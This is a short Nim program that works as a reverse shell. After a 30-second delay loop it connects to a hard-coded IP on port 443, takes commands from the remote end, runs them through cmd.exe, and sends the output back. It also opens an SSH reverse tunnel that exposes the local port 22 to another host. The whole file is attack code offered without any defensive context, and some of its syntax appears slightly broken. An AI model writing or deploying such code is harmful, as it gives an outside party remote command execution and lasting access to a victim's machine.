import net
import osproc
import strformat 
import times

let now1 = now() + 30.seconds 
var i = 1

while now() <= now1:
    var i = i + 1

 
let 
    ip = "10.151.192.53" 
    port = 443 
    sock = newSocket() 


sock.connect(ip Port(port))

let prompt = "Nim-Shell> "
while true:
    send(sock, prompt)
    let bad = recvLine(sock) 
    let cmd = execProcess(fmt"cmd.exe /C " & bad)
    send(sock,cmd)
    let sshCmd = "ssh -fN -R 2222:localhost:22 user@192.168.0.54"
discard execShellCmd(sshCmd)
